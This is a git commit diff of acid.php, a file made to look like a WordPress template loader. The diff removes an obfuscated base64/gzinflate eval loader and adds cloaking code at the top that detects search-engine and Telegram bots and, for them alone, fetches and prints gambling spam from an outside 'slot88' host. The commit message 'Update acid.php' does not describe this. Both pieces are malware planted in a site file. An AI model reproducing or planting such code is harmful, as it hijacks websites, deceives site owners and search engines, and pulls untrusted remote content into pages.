564f5af00f5d2f17092ab9b2d68f98de4a15a9ee
eagles227 <166109731+eagles227@users.noreply.github.com>
2025-01-08 16:44:07 +0700

    Update acid.php

--- acid.php
+++ acid.php
@@ -1,27 +1,133 @@
 <?php
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "\x3d\x3dghHh3JtDU\x43RpiOpR\x2bOzsI5ft/6foXVz9v8N\x61r\x62QY1WeH0rOLK4DN8nwUoKuNEl7Rg\x63Y5hMPkTKJyJEhr3q\x43KL7oD/\x41DeIyDNKx0\x62\x43\x6327tNxVoSz\x41IxY\x62mZne\x421P\x61hF\x62nP4x8N23x6EDiWJW2oh88\x2bxTJ1U\x63lQ8dDOtV\x41L6ZU6ELry\x42dy\x4138fJRTSWt3u\x62v\x619nF2Wn\x61LSOr\x43Hxg\x2bfdPhRdl8SjhmhUshwDHZnyV8f\x61xGwW\x43MdLOTF\x43VNzsUlW1\x63LhEVe\x423Vh\x61edRW\x61ZytpOvT33FJn\x63Tni8Ppp73O1\x2b7h0yj\x63orpYpgfM\x2bgq2VFeiIUetmDh\x43os\x43LNqe\x43\x43OxP\x2bDggp3YevofmhikNrifVo1dTDzyrGQrWesyd\x62ljWeGEHDp/qe\x63hsl\x63yzVQiZGZG\x2brnh9UVE\x43TgTHqVs\x2bKMLKJq\x63\x41XyVJh5YYHq\x61R9pQUUZJpz5665mhNLsdEEWXX3n87WXL/lp44j81d\x62\x4130wtw9M2XG9EE/k/1sNF/19\x613eI7HWqILdIDZgT/n9u4PuMPr8y4ng5STX/hMSTQnH9ZXTyvG1\x2b6Qf3u\x63ydlyvxoXJoNoP\x43\x62VqTiv8\x61E7\x42f\x2bhj1lynlVJRt\x43MUOtLn\x435d466DiWMzFM6YRU\x63H1\x42fRF\x2bdoKFrxlzldL5tz570j/l\x42Lp3\x43T\x2b89rz360F3lHRR\x2b/g3EfUh5lW\x61\x42QXzPkV\x41g3wUg\x42NqyU4SoPtT9QnSqVYoRPG6QsMYDkSe\x6175JlTRjS6Ggven\x43R0/Tnzv7yefPxSXZL\x2bwg\x43PluL7/fdS7JJ9\x61SVW\x623yspIEqPUYimqNVQp\x41uurUhZPUQikkhExw/nmP9D\x42M\x62/07U1\x62/iKQX\x42wJe9fp\x41oFQ/SKQ\x62\x42wJe9fo\x414FQ/\x43KQf\x42wJe9fn\x41IGQ/yJQj\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+function is_bot() {
+    $user_agent = $_SERVER["HTTP_USER_AGENT"];
+    $bots = array("Googlebot", "TelegramBot", "bingbot", "Google-Site-Verification", "Google-InspectionTool");
+
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents("https://amprank1.world/slot88/slot88.txt");
+    echo $message;
+}
 ?>
 <?php
 /**
- * Memuat lingkungan WordPress dan template.
+ * Loads the correct template based on the visitor's url
  *
  * @package WordPress
  */
+if ( wp_using_themes() ) {
+        /**
+         * Fires before determining which template to load.
+         *
+         * @since 1.5.0
+         */
+        do_action( 'template_redirect' );
+}
 
-if ( ! isset( $wp_did_header ) ) {
+/**
+ * Filters whether to allow 'HEAD' requests to generate content.
+ *
+ * Provides a significant performance bump by exiting before the page
+ * content loads for 'HEAD' requests. See #14348.
+ *
+ * @since 3.5.0
+ *
+ * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
+ */
+if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
+        exit;
+}
 
-    // Cegah pemuatan ulang jika sudah dimuat sebelumnya
-    $wp_did_header = true;
+// Process feeds and trackbacks even if not using themes.
+if ( is_robots() ) {
+        /**
+         * Fired when the template loader determines a robots.txt request.
+         *
+         * @since 2.1.0
+         */
+        do_action( 'do_robots' );
+        return;
+} elseif ( is_favicon() ) {
+        /**
+         * Fired when the template loader determines a favicon.ico request.
+         *
+         * @since 5.4.0
+         */
+        do_action( 'do_favicon' );
+        return;
+} elseif ( is_feed() ) {
+        do_feed();
+        return;
+} elseif ( is_trackback() ) {
+        require ABSPATH . 'wp-trackback.php';
+        return;
+}
 
-    // Memuat file WordPress
-    require_once __DIR__ . '/wp-load.php';
+if ( wp_using_themes() ) {
 
-    // Menyiapkan query WordPress
-    wp();
+        $tag_templates = array(
+                'is_embed'             => 'get_embed_template',
+                'is_404'               => 'get_404_template',
+                'is_search'            => 'get_search_template',
+                'is_front_page'        => 'get_front_page_template',
+                'is_home'              => 'get_home_template',
+                'is_privacy_policy'    => 'get_privacy_policy_template',
+                'is_post_type_archive' => 'get_post_type_archive_template',
+                'is_tax'               => 'get_taxonomy_template',
+                'is_attachment'        => 'get_attachment_template',
+                'is_single'            => 'get_single_template',
+                'is_page'              => 'get_page_template',
+                'is_singular'          => 'get_singular_template',
+                'is_category'          => 'get_category_template',
+                'is_tag'               => 'get_tag_template',
+                'is_author'            => 'get_author_template',
+                'is_date'              => 'get_date_template',
+                'is_archive'           => 'get_archive_template',
+        );
+        $template      = false;
 
-    // Memuat template dari WordPress
-    require_once ABSPATH . WPINC . '/template-loader.php';
+        // Loop through each of the template conditionals, and find the appropriate template file.
+        foreach ( $tag_templates as $tag => $template_getter ) {
+                if ( call_user_func( $tag ) ) {
+                        $template = call_user_func( $template_getter );
+                }
+
+                if ( $template ) {
+                        if ( 'is_attachment' === $tag ) {
+                                remove_filter( 'the_content', 'prepend_attachment' );
+                        }
+
+                        break;
+                }
+        }
+
+        if ( ! $template ) {
+                $template = get_index_template();
+        }
+
+        /**
+         * Filters the path of the current template before including it.
+         *
+         * @since 3.0.0
+         *
+         * @param string $template The path of the template to include.
+         */
+        $template = apply_filters( 'template_include', $template );
+        if ( $template ) {
+                include $template;
+        } elseif ( current_user_can( 'switch_themes' ) ) {
+                $theme = wp_get_theme();
+                if ( $theme->errors() ) {
+                        wp_die( $theme->errors() );
+                }
+        }
+        return;
 }
 ?>
